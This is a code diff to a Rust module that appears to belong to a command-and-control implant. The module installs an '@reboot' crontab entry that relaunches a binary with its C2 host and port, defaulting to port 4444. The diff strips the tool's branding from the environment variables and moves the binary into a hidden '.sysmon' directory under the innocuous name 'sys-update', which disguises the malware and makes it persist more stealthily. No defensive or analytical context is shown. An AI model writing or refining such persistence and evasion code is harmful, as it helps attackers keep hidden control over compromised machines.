@@ -7,7 +7,7 @@ pub struct CronPersistence;
 
 fn entry_string(path: &Path, host: &str, port: &str) -> String {
     format!(
-        "@reboot OXIDE_C2_HOST={} OXIDE_C2_PORT={} {}\n",
+        "@reboot C2_HOST={} C2_PORT={} {}\n",
         host,
         port,
         path.display()
@@ -70,8 +70,8 @@ fn write_crontab(content: &str) -> anyhow::Result<()> {
 
 impl PersistenceTrait for CronPersistence {
     fn install(&self, binary_path: &Path) -> anyhow::Result<()> {
-        let host = std::env::var("OXIDE_C2_HOST").unwrap_or_else(|_| "127.0.0.1".to_string());
-        let port = std::env::var("OXIDE_C2_PORT").unwrap_or_else(|_| "4444".to_string());
+        let host = std::env::var("C2_HOST").unwrap_or_else(|_| "127.0.0.1".to_string());
+        let port = std::env::var("C2_PORT").unwrap_or_else(|_| "4444".to_string());
         let existing = read_crontab();
         if entry_present(&existing, binary_path) {
             return Ok(());
@@ -109,10 +109,10 @@ mod tests {
 
     #[test]
     fn entry_string_embeds_env_vars() {
-        let p = Path::new("/home/user/.local/share/oxide/oxide-update");
+        let p = Path::new("/home/user/.local/share/.sysmon/sys-update");
         assert_eq!(
             entry_string(p, "10.10.100.1", "8443"),
-            "@reboot OXIDE_C2_HOST=10.10.100.1 OXIDE_C2_PORT=8443 /home/user/.local/share/oxide/oxide-update\n"
+            "@reboot C2_HOST=10.10.100.1 C2_PORT=8443 /home/user/.local/share/.sysmon/sys-update\n"
         );
     }
 
